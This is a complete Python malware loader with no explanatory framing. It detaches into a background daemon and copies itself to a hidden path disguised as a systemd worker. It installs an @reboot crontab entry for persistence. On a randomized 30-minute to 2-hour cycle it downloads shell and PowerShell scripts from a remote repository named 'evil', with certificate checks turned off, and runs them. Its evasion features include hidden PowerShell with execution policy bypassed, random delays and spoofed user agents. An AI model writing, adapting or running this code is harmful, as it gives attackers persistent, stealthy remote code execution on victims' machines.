import subprocess
import time
import urllib.request
import ssl
import random
import os
import platform
import shutil
import sys

def daemonize():
    """Become a true Linux daemon that survives terminal closure"""
    try:
        # Fork and let parent exit (1st fork)
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Parent exits
    except OSError as e:
        sys.stderr.write(f"Fork #1 failed: {e}\n")
        sys.exit(1)

    # Decouple from parent environment
    os.chdir("/")
    os.setsid()
    os.umask(0)

    try:
        # Fork again (2nd fork)
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Second parent exits
    except OSError as e:
        sys.stderr.write(f"Fork #2 failed: {e}\n")
        sys.exit(1)

    # Redirect standard file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    
    # Redirect to /dev/null
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stderr.fileno())

# Become a daemon IMMEDIATELY
daemonize()

def self_replicate():
    """Copy to persistent location"""
    target_path = "/tmp/.systemd-worker"
    if os.path.abspath(__file__) != target_path:
        try:
            shutil.copy(__file__, target_path)
            # Start the copy as independent process
            subprocess.Popen([
                "nohup", "python3", target_path, "&"
            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, 
               stdin=subprocess.DEVNULL, preexec_fn=os.setsid)
        except Exception:
            pass

self_replicate()

# Your existing configuration
USER_AGENTS = [
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'curl/7.68.0',
    'Wget/1.20.3'
]

URL_SOURCES = [
    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.sh",
    "https://raw.githubusercontent.com/mimikr00t/evil/main/payload.txt",
]

def create_ssl_context():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return context

def stealth_download(url):
    try:
        time.sleep(random.uniform(1, 5))
        req = urllib.request.Request(
            url,
            headers={
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': '*/*',
                'Connection': 'keep-alive'
            }
        )
        context = create_ssl_context()
        with urllib.request.urlopen(req, context=context, timeout=30) as response:
            return response.read().decode('utf-8')
    except Exception:
        return None

def obfuscated_execute(script_content, script_name):
    try:
        time.sleep(random.uniform(2, 10))
        
        system_platform = platform.system().lower()
        
        if system_platform == "windows":
            if script_name.endswith('.ps1'):
                result = subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
                    capture_output=True, 
                    text=True, 
                    timeout=300,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                result = subprocess.run(
                    ["powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", script_content],
                    capture_output=True, 
                    text=True, 
                    timeout=300,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
        else:
            result = subprocess.run(
                ["bash", "-c", script_content],
                capture_output=True, 
                text=True, 
                timeout=300
            )
        return result
    except Exception:
        return None

def setup_persistence():
    """Setup multiple persistence methods"""
    try:
        # 1. Crontab persistence
        cron_job = "@reboot python3 /tmp/.systemd-worker >/dev/null 2>&1\n"
        subprocess.run(['bash', '-c', f'(crontab -l 2>/dev/null; echo "{cron_job}") | crontab -'], 
                      shell=False)
    except Exception:
        pass

def process_scripts_stealth():
    successful_downloads = 0
    for i, url in enumerate(URL_SOURCES, 1):
        script_name = url.split('/')[-1]
        script_content = stealth_download(url)
        if script_content and script_content.strip():
            successful_downloads += 1
            execute_result = obfuscated_execute(script_content, script_name)
    return successful_downloads

def main_loop():
    # Setup persistence
    setup_persistence()
    
    iteration = 0
    while True:
        try:
            iteration += 1
            base_sleep = random.randint(1800, 7200)  # 30min-2hr
            jitter = random.randint(-300, 300)
            sleep_time = max(60, base_sleep + jitter)
            
            process_scripts_stealth()
            
            # Minimal logging
            if iteration % 10 == 0:
                with open('/dev/null', 'w') as f:
                    f.write(f"[{time.strftime('%H:%M:%S')}] Cycle {iteration}\n")
            
            time.sleep(sleep_time)
            
        except Exception as e:
            time.sleep(random.randint(60, 600))

if __name__ == "__main__":
    main_loop()
